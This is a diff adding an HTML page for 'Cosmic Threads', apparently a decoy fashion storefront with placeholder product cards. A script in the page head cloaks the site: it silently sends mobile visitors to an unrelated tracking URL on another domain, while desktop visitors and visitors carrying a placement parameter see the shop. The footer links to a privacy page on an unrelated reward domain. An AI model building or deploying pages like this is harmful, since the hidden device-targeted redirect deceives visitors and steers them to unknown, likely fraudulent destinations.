@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Threads - Otherworldly Fashion</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1a1a2e;
+            color: #e0e0e0;
+        }
+        header {
+            background-color: #16213e;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            color: #00ff9d;
+        }
+        nav {
+            background-color: #0f3460;
+            padding: 10px;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        nav ul li {
+            display: inline;
+            margin-right: 20px;
+        }
+        nav ul li a {
+            color: #e94560;
+            text-decoration: none;
+        }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        .product-card {
+            background-color: #16213e;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+        .product-card img {
+            max-width: 100%;
+            border-radius: 5px;
+        }
+        footer {
+            background-color: #0f3460;
+            color: #e0e0e0;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Threads</h1>
+        <p>Otherworldly Fashion for Interstellar Adventures</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Shop</a></li>
+            <li><a href="#">About Us</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="product-grid">
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200.png?text=Nebula+Jacket" alt="Nebula Jacket">
+                <h3>Nebula Jacket</h3>
+                <p>$199.99</p>
+            </div>
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200.png?text=Starlight+Dress" alt="Starlight Dress">
+                <h3>Starlight Dress</h3>
+                <p>$149.99</p>
+            </div>
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200.png?text=Gravity+Boots" alt="Gravity Boots">
+                <h3>Gravity Boots</h3>
+                <p>$299.99</p>
+            </div>
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200.png?text=Asteroid+Belt" alt="Asteroid Belt">
+                <h3>Asteroid Belt</h3>
+                <p>$79.99</p>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Threads. All rights reserved. | <a href="https://tokreward.com/privacy.html" style="color: #00ff9d;">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
